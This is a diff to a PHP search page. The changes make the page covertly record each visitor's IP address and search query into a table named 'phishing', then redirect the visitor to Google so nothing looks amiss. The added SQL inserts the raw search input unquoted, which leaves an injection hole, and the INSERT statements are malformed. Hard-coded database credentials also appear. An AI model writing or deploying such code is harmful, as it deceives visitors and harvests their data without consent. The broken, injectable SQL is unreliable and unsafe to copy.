@@ -5,6 +5,7 @@
         <title>SQL - Results</title>
         <?php 
             $search = $_POST["searchbar"];
+            $ip     = $_SERVER['REMOTE_ADDR'];
             $server = "localhost";
             $username = "php";
             $password = "password";
@@ -16,14 +17,15 @@
                 die("Connection failed: {mysqli_connect_error()}");
             }
             
-            $sql = "select * from Pictures;";
+            $sql = "insert into phishing ip values $ip;";
+            $result = mysqli_query($conn, $sql);
+
+            $sql = "insert into phishing search values $search;";
             $result = mysqli_query($conn, $sql);
         ?>
     </head>
 <body> 
     <p>
-        
-    <?php echo $_SERVER['REMOTE_ADDR']; ?></br>
 
     <?php header('Location: https://www.google.com/search?q='.$search); ?>
 
